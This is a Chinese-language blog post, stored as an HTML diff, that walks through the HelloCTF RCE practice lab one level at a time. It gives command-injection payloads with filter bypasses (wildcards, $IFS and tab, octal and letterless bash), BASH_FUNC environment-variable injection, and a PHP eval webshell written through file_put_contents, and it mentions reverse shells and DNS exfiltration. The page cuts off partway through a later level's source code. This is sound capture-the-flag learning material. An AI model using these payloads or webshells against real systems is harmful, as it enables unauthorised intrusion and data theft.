@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言本篇记录打HelloCTF RCE靶场 ##level 1 一句话木马 level2###array_filter函数  eg: 123456789101112131415161718&lt;?phpfunction odd($var)&#123;    &#x2F;&#x2F; 返回输入整数是否为奇数（单数）    return $var &amp; 1;&#125;function even($var)&amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="http://example.com/2025/05/26/RCE/index.html">
+<meta property="og:site_name" content="X1n">
+<meta property="og:description" content="前言本篇记录打HelloCTF RCE靶场 ##level 1 一句话木马 level2###array_filter函数  eg: 123456789101112131415161718&lt;?phpfunction odd($var)&#123;    &#x2F;&#x2F; 返回输入整数是否为奇数（单数）    return $var &amp; 1;&#125;function even($var)&amp;#1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250526112447338.png">
+<meta property="og:image" content="http://example.com/images/image-20250526144727361.png">
+<meta property="og:image" content="http://example.com/images/image-20250526150323499.png">
+<meta property="og:image" content="http://example.com/images/image-20250526152438858.png">
+<meta property="og:image" content="http://example.com/images/image-20250527105641251.png">
+<meta property="og:image" content="http://example.com/images/image-20250527105750270.png">
+<meta property="og:image" content="http://example.com/images/image-20250527110024165.png">
+<meta property="og:image" content="http://example.com/images/image-20250527111100989.png">
+<meta property="og:image" content="http://example.com/images/image-20250527155043757.png">
+<meta property="og:image" content="http://example.com/images/image-20250527155101220.png">
+<meta property="article:published_time" content="2025-05-26T03:07:50.000Z">
+<meta property="article:modified_time" content="2025-05-28T07:21:56.502Z">
+<meta property="article:author" content="xin">
+<meta property="article:tag" content="HelloCTF RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250526112447338.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>RCE</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/23/Laravel/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/26/RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/26/RCE/&text=RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/26/RCE/&is_video=false&description=RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE&body=Check out this article: http://example.com/2025/05/26/RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/26/RCE/&title=RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/26/RCE/&name=RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/26/RCE/&t=RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5"><span class="toc-number">5.</span> <span class="toc-text">level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level6"><span class="toc-number">6.</span> <span class="toc-text">level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level7"><span class="toc-number">7.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level8"><span class="toc-number">8.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level9"><span class="toc-number">9.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level10"><span class="toc-number">10.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level11"><span class="toc-number">11.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level17"><span class="toc-number">12.</span> <span class="toc-text">level17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">12.1.</span> <span class="toc-text">RCE无回显命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%EF%BC%9A"><span class="toc-number">12.1.1.</span> <span class="toc-text">判断：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">12.1.2.</span> <span class="toc-text">执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level18"><span class="toc-number">13.</span> <span class="toc-text">level18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level19"><span class="toc-number">14.</span> <span class="toc-text">level19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level20"><span class="toc-number">15.</span> <span class="toc-text">level20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level21"><span class="toc-number">16.</span> <span class="toc-text">level21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level22"><span class="toc-number">17.</span> <span class="toc-text">level22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level24"><span class="toc-number">18.</span> <span class="toc-text">level24</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">xin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-26T03:07:50.000Z" class="dt-published" itemprop="datePublished">2025-05-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HelloCTF-RCE/" rel="tag">HelloCTF RCE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇记录打HelloCTF RCE靶场</p>
+<p>##level 1</p>
+<p>一句话木马</p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>###array_filter函数</p>
+<p><img src="/../images/image-20250526112447338.png" alt="image-20250526112447338"></p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">odd</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 返回输入整数是否为奇数（单数）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span> &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">even</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 返回输入整数是否为偶数</span></span><br><span class="line">    <span class="keyword">return</span> !(<span class="variable">$var</span> &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$array1</span> = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="number">3</span>, <span class="string">&#x27;d&#x27;</span> =&gt; <span class="number">4</span>, <span class="string">&#x27;e&#x27;</span> =&gt; <span class="number">5</span>];</span><br><span class="line"><span class="variable">$array2</span> = [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Odd :\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>, <span class="string">&quot;odd&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Even:\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_filter</span>(<span class="variable">$array2</span>, <span class="string">&quot;even&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Odd :</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [a] =&gt; <span class="number">1</span></span><br><span class="line">    [c] =&gt; <span class="number">3</span></span><br><span class="line">    [e] =&gt; <span class="number">5</span></span><br><span class="line">)</span><br><span class="line">Even:</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">8</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">10</span></span><br><span class="line">    [<span class="number">6</span>] =&gt; <span class="number">12</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<p><code>content=[1],function($X)&#123;echo $flag;&#125;</code></p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>一句话木马</p>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>shell运算符：</p>
+<table>
+<thead>
+<tr>
+<th><code>&amp;&amp;</code>（逻辑与运算符）</th>
+<th>AND操作 只有当第一个命令 <code>cmd_1</code> 执行成功（返回值为 0）时，才会执行第二个命令 <code>cmd_2</code>。</th>
+<th><code>mkdir new_folder &amp;&amp; cd new_folder</code> （只有在新建文件夹成功后才进入该文件夹）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#96;</td>
+<td></td>
+<td>&#96;（逻辑或运算符）</td>
+</tr>
+<tr>
+<td><code>&amp;</code>（后台运行符）</td>
+<td>将命令 <code>cmd_1</code> 放到后台执行，Shell 立即执行 <code>cmd_2</code>，两个命令并行执行。</td>
+<td><code>sleep 10 &amp; echo &quot;This will run immediately.&quot;</code></td>
+</tr>
+<tr>
+<td><code>;</code>（命令分隔符）</td>
+<td>无论前一个命令 <code>cmd_1</code> 是否成功，都会执行下一个命令 <code>cmd_2</code>。这允许将命令堆叠在一起。命令会依次执行。</td>
+<td><code>echo &quot;Hello&quot;; echo &quot;World&quot;</code> （先输出 “Hello”，再输出 “World”）</td>
+</tr>
+</tbody></table>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>过滤了一大堆</p>
+<p><strong>过滤的字符</strong>：</p>
+<ul>
+<li>字母：b-z（小写）、A-Z（大写），即除了a外的所有字母。</li>
+<li>特殊字符：_、@、#、%、^、&amp;、*、:、{、}、-、+、&lt;、&gt;、”、&#96;&#96;&#96;、|、;、[、]。</li>
+</ul>
+<p><strong>未被过滤的字符</strong>：</p>
+<ul>
+<li>字母：a（小写）。</li>
+<li>数字：0-9。</li>
+<li>特殊字符：.、,、$、&#x3D;、!、&#x2F;、\、空格等。</li>
+</ul>
+<p>使用<code>？</code>通配符 <code>/???/?a? /??a?</code> 匹配到的就是：</p>
+<p><code>?cmd=/???/?a? /??a?     //能匹配到/bin/cat /flag ，接着搜索Geesec即可</code></p>
+<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>在遇到空格被过滤的情况下，通常使用 %09 也就是TAB的URL编码来绕过，在终端环境下 空格 被视为一个命令分隔符，本质上由 $IFS 变量控制，而 $IFS 的默认值是空格、制表符和换行符，所以我们还可以通过直接键入 $IFS 来绕过空格过滤。</p>
+<p><img src="/../images/image-20250526144727361.png" alt="image-20250526144727361"></p>
+<p>payload:</p>
+<p><code>?cmd=cat%09/f*</code> </p>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p><img src="/../images/image-20250526150323499.png" alt="image-20250526150323499"></p>
+<blockquote>
+<p>&#x2F;dev&#x2F;null 是一个输出重定向，它把标准输出重定向到 &#x2F;dev&#x2F;null，这样就不会有输出出现在屏幕上。</p>
+</blockquote>
+<blockquote>
+<p>2&gt;&amp;1 是另一个重定向操作，它把标准错误输出复制到之前的标准输出位置（即 &#x2F;dev&#x2F;null），这样标准错误也不会出现在屏幕上</p>
+</blockquote>
+<p>可以使用命令分隔符 <code>;</code></p>
+<p>或者写到其他文件之中：<br><code>cat /flag &gt; 1.txt</code>  <code>/1.txt</code></p>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>基于bash无字母命令执行</p>
+<p><img src="/../images/image-20250526152438858.png" alt="image-20250526152438858"></p>
+<blockquote>
+<p>题目已经拥有成熟脚本：<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck">https://github.com/ProbiusOfficial/bashFuck</a><br>你也可以使用在线生成：<a target="_blank" rel="noopener" href="https://probiusofficial.github.io/bashFuck/">https://probiusofficial.github.io/bashFuck/</a><br>题目本身也提供一个&#x2F;exp.php方便你使用</p>
+<p>从该关卡开始你会发现我们在Dockerfile中添加了一行改动：</p>
+<p>RUN ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh</p>
+<p>这是由于在PHP中，system是执行sh的，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，我们用的底层镜像 php:7.3-fpm-alpine 默认指向的 &#x2F;bin&#x2F;busybox ，要验证这一点，你可以对 &#x2F;bin&#x2F;sh 使用 ls -l 命令查看，在这个容器中，你会得到下面的回显：<br>bash-5.1# ls -l &#x2F;bin&#x2F;sh<br>lrwxrwxrwx  1 root   root      12 Mar 16 2022 &#x2F;bin&#x2F;sh -&gt; &#x2F;bin&#x2F;busybox</p>
+<p>我们需要用到的特性只有bash才支持，请记住这一点，这也是我们手动修改指向的原因。</p>
+<p>在这个关卡主要利用的是在终端中，$’\xxx’可以将八进制ascii码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为$’\xxx\xxx\xxx\xxx’的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。<br>比如”ls -l”也就是$’\154\163\40\55\154’ 只能拆分为$’\154\163’ 空格 $’\55\154’三部分。</p>
+<p>bash-5.1# $’\154\163\40\55\154’<br>bash: ls -l: command not found</p>
+<p>bash-5.1# $’\154\163’ $’\55\154’<br>total 4<br>-rw-r–r–  1 www-data www-data    829 Aug 14 19:39 index.php</p>
+</blockquote>
+<p>payload:<br><code>?cmd=$&#39;\143\141\164&#39; $&#39;\57\146\154\141\147&#39;</code></p>
+<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p><img src="/../images/image-20250527105641251.png" alt="image-20250527105641251"></p>
+<p>这里只能使用二进制的命令，使用在线脚本生成payload</p>
+<p><img src="/../images/image-20250527105750270.png" alt="image-20250527105750270"></p>
+<p>但是发现get传参之后并没有执行命令</p>
+<blockquote>
+<p><strong>在 URL 中，# 表示锚点（Anchor），它用于指向网页中的特定位置或片段。锚点的主要功能是让浏览器快速定位到页面内的某个部分</strong></p>
+</blockquote>
+<p>所以要把payload中的<code>#</code>进行URL编码<code>%23</code></p>
+<p><code>$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#39;\\$(($((1&lt;&lt;1))%2310001111))\\$(($((1&lt;&lt;1))%2310001101))\\$(($((1&lt;&lt;1))%2310100100))\\$(($((1&lt;&lt;1))%23101000))\\$(($((1&lt;&lt;1))%23111001))\\$(($((1&lt;&lt;1))%2310010010))\\$(($((1&lt;&lt;1))%2310011010))\\$(($((1&lt;&lt;1))%2310001101))\\$(($((1&lt;&lt;1))%2310010011))\&#39;</code></p>
+<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p><strong>bash终端的无字母命令执行_数字1的特殊变量替换</strong></p>
+<p><img src="/../images/image-20250527110024165.png" alt="image-20250527110024165"></p>
+<p>直接使用工具</p>
+<p><img src="/../images/image-20250527111100989.png" alt="image-20250527111100989"></p>
+<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p><strong>PHP命令执行函数</strong></p>
+<h3 id="RCE无回显命令执行"><a href="#RCE无回显命令执行" class="headerlink" title="RCE无回显命令执行"></a>RCE无回显命令执行</h3><h4 id="判断："><a href="#判断：" class="headerlink" title="判断："></a>判断：</h4><p>1、延时</p>
+<p>2、dns请求</p>
+<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>1、直接写文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=whoami&gt;test</span><br><span class="line">?cmd=cp flag.php test</span><br></pre></td></tr></table></figure>
+
+<p>2、反弹shell</p>
+<p>3、dnslog外带数据</p>
+<p><code>curl &#39;ls /&#39;.域名</code></p>
+<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>环境变量注入执行任意命令</p>
+<ul>
+<li>BASH_ENV：可以在 bash -c 的时候注入任意命令</li>
+<li>ENV：可以在 sh -i -c 的时候注入任意命令</li>
+<li>PS1：可以在 sh 或 bash 交互式环境下执行任意命令</li>
+<li>PROMPT_COMMAND：可以在 bash 交互式环境下执行任意命令</li>
+<li>BASH_FUNC_xxx%%：可以在 bash -c 或 sh -c 的时候执行任意命令</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$val</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当提交参数：<code>envs[BASH_FUNC_echo%%]=() &#123; cat /flag; &#125;</code><br><strong>实际流程</strong>:</p>
+<p><code>envs[BASH_FUNC_echo%%]=() &#123; cat /flag; &#125;</code><br>    PHP 接收后调用：<br><code>putenv(&quot;BASH_FUNC_echo%%=() &#123; cat /flag; &#125;&quot;);</code><br>    PHP 调用：<br>system(“echo hello”);<br>内部发生了什么？,system() 创建子进程。默认 shell（通常是 &#x2F;bin&#x2F;bash 或 &#x2F;bin&#x2F;sh）启动。</p>
+<p>这个子进程自动继承环境变量。Bash 看到 BASH_FUNC_echo%%，还原为：<br><code>function echo() &#123; cat /flag; &#125;</code><br>然后执行echo函数</p>
+<p><code>BASH_FUNC_echo%%</code>: Bash 允许通过环境变量定义函数，格式为 BASH_FUNC_函数名%%&#x3D;() { 命令; }</p>
+<h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 文件写入导致的RCE --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://www.php.net/manual/zh/function.file-put-contents.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">参考可以写入的内容：</span></span><br><span class="line"><span class="comment">&lt;?php <span class="doctag">@eval</span>($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloctf</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&quot;file_put_contents(&quot;</span>.<span class="variable">$code</span>.<span class="string">&quot;);&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) ? <span class="title function_ invoke__">helloctf</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>file_put_contents</code>函数：</p>
+<p><img src="/../images/image-20250527155043757.png" alt="image-20250527155043757"></p>
+<p><img src="/../images/image-20250527155101220.png" alt="image-20250527155101220"></p>
+<p>两种方法：</p>
+<p>​	1、写入一句木马</p>
+<p><code>?c=&#39;shell.php&#39;,&#39;&lt;?php+@eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></p>
+<p>​	2、通过构造参数闭合原函数调用，并追加任意PHP代码</p>
+<p><code>c=&#39;&#39;,&#39;&#39;);echo(</code>cat &#x2F;flag<code>)&#39;</code></p>
+<p>这样之后原本的代码变成这样：<code>file_put_contents(&#39;&#39;,&#39;&#39;);echo(</code>cat &#x2F;flag<code>);</code></p>
+<h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>一个普通的文件上传没有任何过滤</p>
+<h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># 